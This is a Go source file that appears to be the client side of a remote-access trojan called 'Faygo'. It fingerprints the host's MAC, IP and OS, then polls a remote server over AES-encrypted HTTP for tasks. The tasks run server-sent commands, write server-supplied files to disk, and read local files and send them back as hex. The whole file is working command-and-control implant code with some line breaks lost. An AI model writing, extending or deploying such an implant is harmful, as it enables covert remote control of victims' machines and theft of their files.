package mainimport (
	"Faygo/client/module/file"
	net "Faygo/client/module/net"
	"fmt"
	"os"
	"runtime"
	"time"
)func main() {
		
	c1 := Client{
		Mac: GetMac(),
		Lan: GetIP(),
		Os:  runtime.GOOS,
	}		
	
	ok := GetServer()
	if !ok {
		os.Exit(0)
	} else {		for {
			
			response := c1.GetStatus()
			
			dealtask := Client{}
			dealtask.Json2Struct(response)
			switch dealtask.Status {
			
			case 0:
				c1.InitClient()
				
			case 1:
				sleep := dealtask.Sleep
				c1 = Client{Mac: dealtask.Mac, Status: dealtask.Status, Task: "", Result: ""}
				
				time.Sleep(time.Duration(sleep) * time.Second)
			case 2:
				
				
								
				c1.Status = dealtask.Status
				c1.Task = dealtask.Task
				c1.Runcommand()
				fmt.Println(c1)
				GetTask(c1)
				
			case 3: 
				c1.Status = dealtask.Status
				c1.FileLo = dealtask.FileLo
				c1.FileHex = dealtask.FileHex
				c1.FileHex = file.HexToFile(dealtask.FileHex, dealtask.FileLo) 
				GetTask(c1)
				
			case 4: 
				c1.Status = dealtask.Status
				c1.FileLo = dealtask.FileLo
				c1.FileHex = file.FileToHex(dealtask.FileLo)
				
				GetTask(c1)
				time.Sleep(time.Duration(dealtask.Sleep) * time.Second)
				
			case 5: 
				os.Exit(0)
			default:
				fmt.Println("error3")
			}		}	}}
func GetServer() bool {
	
	
	
	return net.HttpGet(RemoteHost) == "200 OK"
}func (c *Client) GetStatus() string {
	
	
	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))}func GetTask(c Client) {
	
	net.HttpPost(RemoteHost, AesEnCode(Struct2Json(c)))}func (c *Client) InitClient() string {
	c.Status = 1
	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))}
